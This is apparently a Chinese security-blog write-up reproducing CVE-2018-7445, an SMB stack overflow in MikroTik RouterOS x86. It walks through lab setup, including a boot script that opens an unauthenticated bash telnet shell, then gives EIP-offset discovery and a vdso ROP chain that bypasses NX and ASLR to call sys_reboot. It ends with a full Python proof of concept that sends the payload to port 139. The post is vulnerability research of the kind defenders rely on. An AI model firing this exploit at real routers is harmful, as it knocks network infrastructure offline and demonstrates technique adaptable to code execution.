**前面几篇文章分析了mips,arm,这次挑一个开启了NX和ASLR保护的x86架构的路由器。**  

###  **【传送门】**

> [通过CVE-2017-17215学习路由器漏洞分析，从入坑到放弃](http://www.freebuf.com/vuls/160040.html)
>
> [路由器漏洞复现分析第二弹：CNVD-2018-01084](http://www.freebuf.com/vuls/162627.html)
>
> [路由器漏洞复现分析第三弹：DVRF
> INTRO题目分析](http://www.freebuf.com/articles/wireless/163823.html)
>
>
> [路由器漏洞复现分析第四弹：CVE-2018-7034](http://www.freebuf.com/articles/wireless/165716.html)
>
>
> [路由器漏洞分析第五弹：CVE-2018-5767路由器远程代码执行](http://www.freebuf.com/articles/wireless/166869.html)

## 一. 漏洞概述

[CVE-2018-7445](http://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-7445)
MikroTik RouterOS SMB 缓冲区溢出

参考信息：<https://www.coresecurity.com/advisories/mikrotik-routeros-smb-buffer-overflow>

### 漏洞固件版本：

mikrotik-6.40.6.iso x86版本

下载地址：<https://mikrotik.com/download>

Mikrotik的漏洞最早进入视野(我的)是去年早些时候泄露的[CIA武器库](https://github.com/BigNerd95/Chimay-Red)。根据卡巴的信息,有APT组织对mikrotik的漏洞用的很多：

> 几天前，卡巴斯基实验室的安全专家宣布已经发现了一个新的复杂的 APT 组织，该组织从至少 2012
> 年起至少已经在雷达中运行。卡巴斯基跟踪该组织，并确定了它使用的一系列恶意软件，称为 Slingshot，以妥协中东和非洲数十万受害者的系统。
>
> 研究人员已经在肯尼亚，也门，阿富汗，利比亚，刚果，约旦，土耳其，伊拉克，苏丹，索马里和坦桑尼亚发现了约 100
> 名弹弓受害者并发现了其模块。肯尼亚和也门迄今为止感染人数最多。大多数受害者是个人而非组织，政府组织数量有限。APT 组利用拉脱维亚网络硬件提供商
> Mikrotik 使用的路由器中的零日漏洞（CVE-2007-5633;
> CVE-2010-1592，CVE-2009-0824）将间谍软件放入受害者的计算机中。
>
> 攻击者首先破坏路由器，然后用文件系统中的恶意代码替换它的一个 DLL，当用户运行 Winbox Loader 软件（Mikrotik
> 路由器管理套件）时，该库将加载到目标计算机内存中。
>
> 该 DLL 文件在受害者的机器上运行，并连接到远程服务器以下载最终有效负载，即卡巴斯基监控的攻击中的 Slingshot 恶意软件。目前还不清楚
> Slingshot 团伙是否也利用 CVE-2018-7445 漏洞危害路由器。

## 二. 漏洞分析.

### 2.1 搭建router os分析环境

先安装router os， 打开iso文件,删除掉默认硬盘,增加一个IDE硬盘

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232698559694.png!small)

开机

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232698819353.png!small)

按a选择全部,然后I安装,一路y

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232848011434.png!small)

安装完成后重启，admin和空密码登然后setup命令设置ip

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/1523284892208.png!small)

如果一切顺利此时可以ssh连接到rooteros了

Rooteros不支持一些基本的linux命令,为了更方便的操作,需要将busybox和gdbserver 放进去.

将cd选择为一个ubuntu的镜像

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232850699474.png!small)

选择开机前进入bios设置启动选项,

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232850957854.png!small)

选择先从cd启动

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232851179170.png!small)

再重启虚拟机, 选择 try ubuntu  

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232851659343.png!small)

进入系统后，将 `/dev/sda2 mount到创建的临时文件夹`

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852037405.png!small)  

把busybox和gdbserver 拷贝到bin目录下

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852228675.png!small)

并创建如下路径的脚本,当路由器系统启动的时候会自动执行此脚本  

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852398267.png!small)

PS:要修改这3个文件为可执行

脚本内容:

    
    
    #!/bin/bash
    
    
    mkdir /ram/mybin
    
    
    /flash/bin/busybox-i686 --install -s /ram/mybin
    
    
    export PATH=/ram/mybin:$PATH
    
    
    telnetd -p 23000 -l bash

再重启路由器后,就可以通过telnet连接进去

    
    
    telnet192.168.174.160 23000

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852665733.png!small)  

telnet成功

Namp 扫一下,发现并没有开139端口.

需要使用如下命令打开SMB服务.

    
    
    Ip smb setenabled=yes

再用 ip smb print 查看

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852831903.png!small)  

Nmap确认一下

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232852984076.png!small)

Gdbsever attach上去, gdbserver 192.168.174.153:1234 --attach $(pidof smb)

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232853133189.png!small)

好的,IDA远程调试, fire inthe hole

### 2.2 控制eip

栈溢出发生在下面函数, 其中a2为拷贝的源地址,a2第一个值被当做拷贝的长度，那么当a2第一位值大于a1的长度的时候，发生溢出

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232853365352.png!small)  

需要对服务器发送smb协议中的session信息才能进入到此函数处理中，需要如下的smb包

header =struct.pack("!ccH", NETBIOS_SESSION_REQUEST,
NETBIOS_SESSION_FLAGS，len（data））  

先用pwntool 找下 eip的位置

    
    
    x=cyclic(500）
    
    attack= header + x

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232853683194.png!small)

    
    
    cyclic_find(0x61617a61)=99

测试一下

    
    
    buf = header + “\xff”*99+BBBB,此时crash在eip为42424242

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232853865550.png!small)

### 2.3 rop链构造

Smb里面没有dlsym，system等东西，只能看看so了，先看下加载了哪些so

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854129115.png!small)

    
    
    # cat /proc/sys/kernel/randomize_va_space

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854296504.png!small)  

看一下发现aslr开启了，每次lib的地址都不 一样。

Dep也开启了

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854413150.png!small)

由于smb里面没有引用system和dlysm函数，vdso里面有int80，那么考虑用int80来调用sys_reboot.

用gdb attach到调试程序targetremote 192.168.174.160:1234

Vdso的地址是固定的，Vdso dump下来

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854576563.png!small)

找到godget

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854717841.png!small)

sys_reboot对应系统调用编号为88

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232854902950.png!small)

需要构造4个参数

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232855056087.png!small)

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232855254461.png!small)

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232855331665.png!small)  

  
那么构造出如下参数

    
    
    ebx=0xfee1dead
    
    ecx=672274793
    
    edx=0x1234567
    
    esi=0

搜索godget:

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232855756946.png!small)

构造如下的rop链

    
    
    payload=""
    
    #准备edx ecx ebx esi参数  
    
    
    payload +=p32(0x08054017)# : pop edx ; pop ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ;ret
    
    payload +=p32(0x1234567) # edx
    
    payload +=p32(672274793) # ecx  
    
    payload +=p32(0xfee1dead)# ebx
    
    payload +=p32(0x0)# esi 
    
    payload +=p32(0xaaaaaaaa)# edi
    
    payload +=p32(0xaaaaaaaa)# ebp
    
    #准备eax ebx参数  
    
    
    payload +=p32(0x0804f7da)# : pop eax ; pop ebx ; pop ebp ; ret
    
    payload +=p32(0x00000058) # eax = sys_reboot
    
    payload +=p32(0xfee1dead) # ebx 
    
    payload +=p32(0xaaaaaaaa) # ebp
    
    #call int80  
    
    
    payload +=p32(0xFFFFE422)# int 0x80; pop ebp; pop edx; pop ecx; ret
    
    payload +=p32(0xaaaaaaaa) # ebp 
    
    payload +=p32(0x0) # edx   
    
    
    payload+= p32(0x0)  # ecx

执行后,

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232856323307.png!small)

路由器重启成功!

![路由器第六弹 ：CVE-2018-7445 MikroTik RouterOS Buffer
Overflow](https://image.3001.net/images/20180409/15232856487922.png!small)  

## 完整poc

    
    
    #!/usr/bin/envpython
    
    importsocket
    
    importstruct
    
    import sys
    
    from pwnimport *
    
    context(arch= 'i386', os = 'linux')
    
    NETBIOS_SESSION_REQUEST= "\x81"
    
    NETBIOS_SESSION_FLAGS= "\x00"
    
    payload=""
    
    payload +=p32(0x08054017)# : pop edx ; pop ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ;ret
    
    payload +=p32(0x1234567) # edx
    
    payload +=p32(672274793) # ecx  
    
    payload +=p32(0xfee1dead)# ebx
    
    payload +=p32(0x0)# esi 
    
    payload +=p32(0xaaaaaaaa)# edi
    
    payload +=p32(0xaaaaaaaa)# ebp
    
    payload +=p32(0x0804f7da)# : pop eax ; pop ebx ; pop ebp ; ret
    
    payload +=p32(0x00000058) # eax = sys_reboot
    
    payload +=p32(0xfee1dead) # ebx 
    
    payload +=p32(0xaaaaaaaa) # eb   
    
    
    payload +=p32(0xFFFFE422)# int 0x80; pop ebp; pop edx; pop ecx; ret
    
    payload +=p32(0xaaaaaaaa) # ebp 
    
    payload +=p32(0x0) # edx   
    
    
    payload +=p32(0x0)  # ecx
    
    header =struct.pack("!ccH", NETBIOS_SESSION_REQUEST, NETBIOS_SESSION_FLAGS,len(payload)+99)
    
    x="\xff"*99
    
    attack =header + x+payload
    
    if __name__== "__main__"：
    
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    
        s.connect(("192.168.174.160",139))
    
        s.send(attack)

 ***本文作者：kczwa1，转载请注明来自FreeBuf.COM**  

